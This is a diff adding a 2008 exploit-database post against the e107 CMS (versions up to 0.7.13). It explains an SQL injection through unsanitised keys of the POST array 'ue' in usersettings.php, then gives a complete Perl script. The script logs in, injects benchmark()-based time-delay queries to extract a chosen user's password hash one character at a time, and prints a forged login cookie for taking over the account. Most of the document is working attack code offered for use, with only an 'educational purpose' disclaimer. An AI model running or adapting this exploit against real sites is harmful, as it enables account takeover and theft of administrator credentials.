@@ -1,0 +1,213 @@
+# Author:    __GiReX__	
+# Homepage:  http://girex.altervista.org
+# Date:      19/10/2008
+
+# CMS:       e107
+# URL:       http://e107.org/
+
+# Note:	     Works regardless of php.ini settings (magic_quotes, register_globals..)
+
+# Attenction: This exploit was written for educational purpose. 
+# Use it at your own risk. Author will be not responsible for any damage.
+
+
+# Description: e107 is a content management system written in PHP 
+# and using the popular open source MySQL database system for content storage. 
+# It's completely free, totally customisable and in constant development.
+
+
+# Bug description:
+# e107 presents a vuln in userssettings.php (line 363-395), a POST array ($_POST['ue'])
+# goes into an update query, it cleans the values of this array but not the keys name...
+
+# File: usersettings.php (line 363-395)
+	if($_POST['ue'])
+        ...
+		foreach($_POST['ue'] as $key => $val)
+			$err = $ue->user_extended_validate_entry($val,$extList[$key]);
+			if(!$err)
+			  $val = $tp->toDB($val);						   <== Cleans values
+			  $ue_fields .= $key."='".$val."'";                <== Here our $_POST['ue'] keys and values
+		}
+    }
+	...
+# Lines: 496-500	
+
+	if($ue_fields)
+	{
+        // ***** Next line creates a record which presumably should be there anyway, so could generate an error
+		$sql->db_Select_gen("INSERT INTO #user_extended (user_extended_id, user_hidden_fields) values ('".intval($inp)."', '')");
+		$sql->db_Update("user_extended", $ue_fields." WHERE user_extended_id = '".intval($inp)."'");  <== Here vulnearable query
+	}
+
+# As you can see the return value of the update query isn't checked so we have to use a blind benchmark() method
+
+
+
+#!/usr/bin/perl 
+# e107 <= 0.7.13 Blind SQL Injection Exploit
+# Admin/User's Password Retrieve Exploit
+# Works regardless of php.ini settings
+# Coded by __GiReX__
+
+use POSIX;
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Digest::MD5  qw(md5 md5_hex md5_base64); 
+
+if(@ARGV < 4)
+{
+    banner();
+    print "[+] You need an user account to run this exploit\n\n";
+    print "[+] Usage: perl $0 <host> <path> <your_username> <your_pass> <victim_id>\n";
+    print "[+] Example: perl $0 localhost /e107/ test password 1\n";
+    exit;
+}
+
+my $target  =  ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0].$ARGV[1]:  'http://' . $ARGV[0].$ARGV[1];
+my ($user, $pass, $id) = ($ARGV[2], $ARGV[3], ($ARGV[4]) ? $ARGV[4] : 1);
+
+my $lwp =  new LWP::UserAgent or die;
+my $cookie_jar = new HTTP::Cookies or die;
+$lwp->cookie_jar( $cookie_jar );
+
+my @cset  =  (48..57, 97..102); 
+
+my $benchmark = 1000000;
+my $prefix = "e107";     
+my $hash = "";
+
+banner();
+try_login($user, $pass) or die "[-] Unable to login with $user and $pass\n";
+
+syswrite(STDOUT,      "[+] Logged in with your account..\n".
+                      "[+] Checking database delay, please wait..\n\n" );
+
+$ndelay = check_bench("1=0");
+print STDOUT "[+] Normal delay: $ndelay\n";
+
+$bdelay = check_bench("1=1");
+print STDOUT "[+] Benchmark delay: $bdelay\n\n"; 
+
+if($bdelay - $ndelay < 4)
+{
+    print STDOUT "[-] Benchmarck delay too small compared to normal delay, increase it.\n";
+    exit ();
+}
+
+    
+for(my $j = 1; $j <= 32; $j++)
+{  
+    foreach $char(@cset)
+    {    
+        info(chr($char), $hash, "password");
+        
+        my ($pre_time, $post_time) = time();
+        $rv = check_char($char, $j, "user_password");    
+        $post_time = time();
+    
+             if($rv and ($post_time - $pre_time) > ($ndelay + 3))
+             {        
+                 $hash .= chr($char);
+                 last;
+             }
+    }
+    
+    last if $j != length($hash);
+}    
+
+if(not defined $hash or length($hash) != 32)
+{
+    print STDOUT "\n\n[-] Exploit mistake: please re-check benchmark\n";
+    exit;
+}
+else
+{
+    print STDOUT "\n\n[+] You can try to login with this cookie:\n";
+    print STDOUT "[+] Cookie: ${cookie_prefix}cookie=${id}.". md5_hex($hash)."\n";
+}
+
+sub try_login
+{
+   my ($user, $pass) = @_;   
+     
+     my $res = $lwp->post( $target.'news.php' , 
+                                
+                                [ 'username'  =>  $user,
+                                  'userpass'  =>  $pass,
+                                  'userlogin' =>  'Login',
+                                  'autologin' =>  '1' ] );
+                                  
+     if($res->status_line =~ /^302|200|301/ or $res->is_success)
+      {
+          if($res->as_string =~ /Set-Cookie: (.+)cookie/)
+          {
+                $cookie_prefix = $1;
+                return 1;
+          }
+          
+          return undef;
+      }
+    
+  die ("[-] Unable to request ${target}news.php ".$res->status_line."\n");
+ }
+
+sub info
+{
+  my($c, $cur, $str)  =  @_;
+    
+    $cur = '' unless defined $cur;
+    print  STDOUT "[+] Victim ${str}: ${cur}${c}\r";
+    
+  $| = 1; 
+}
+
+sub check_bench
+{
+  my $true = shift;
+  my $delay = 0;
+
+    my $sql = "user_hidden_fields=99 AND CASE WHEN(${true}) THEN benchmark(${benchmark}, MD5(1)) END#";
+       
+    for(1..3)
+    {
+        my ($pre_time, $post_time) = time();  
+    
+        my $res = $lwp->post( $target.'usersettings.php',
+                                [ 'email'  =>  'damn@email.com',
+                                  'updatesettings' => 'Save Settings',
+                                  "ue[${sql}]" => 'damn' ]);        
+        $post_time = time();        
+        
+        $delay += int($post_time - $pre_time);
+		}
+        
+  return ceil($delay / 3);
+}
+
+sub check_char
+{
+  my ($char, $n, $field)  =  @_ ;
+  $rand = int($char + $n);
+  
+  my $sql = "user_hidden_fields=${rand} AND CASE WHEN(SELECT ASCII(SUBSTRING(${field},${n},1)) ".
+            "FROM ${prefix}_user WHERE user_id=${id})=${char} THEN benchmark(${benchmark}, MD5(1)) END#";
+       
+    my $res = $lwp->post( $target.'usersettings.php',
+                                [ 'email'  =>  'damn@email.com',
+                                  'updatesettings' => 'Save Settings',
+                                  "ue[${sql}]" => 'damn' ]);                    
+        
+  return $res->is_success;
+}
+
+sub banner
+{
+    print "\n";
+    print "[+] e107 <= 0.7.13 Blind SQL Injection\n";
+    print "[+] Admin/User's Password Retrieve Exploit\n";
+    print "[+] Coded by __GiReX__\n";
+    print "\n";
+}
+
+# milw0rm.com [2008-10-19]
